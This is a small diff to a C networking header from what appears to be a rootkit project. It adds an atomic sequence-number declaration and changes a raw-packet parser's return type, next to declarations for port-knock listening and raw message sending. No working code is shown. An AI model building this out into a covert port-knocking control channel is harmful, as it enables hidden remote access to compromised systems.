@@ -5,6 +5,7 @@
 #include <utils/utils.h>
 #include <sys/types.h>
 
+extern _Atomic uint16_t sequence_number;
 
 #define REPLY_DEST_PORT 8080
 
@@ -25,7 +26,7 @@ int listen_port_knock(const struct client_options * client_options);
 
 // Raw packet functions
 void send_message(int socket_fd, const char * dest_ip, int port, const char * message);
-uint16_t parse_raw_packet(const char *buffer, ssize_t n);
+struct packet_data * parse_raw_packet(const char *buffer, ssize_t n);
 
 
 #endif //ROOTKIT_NETWORKING_H
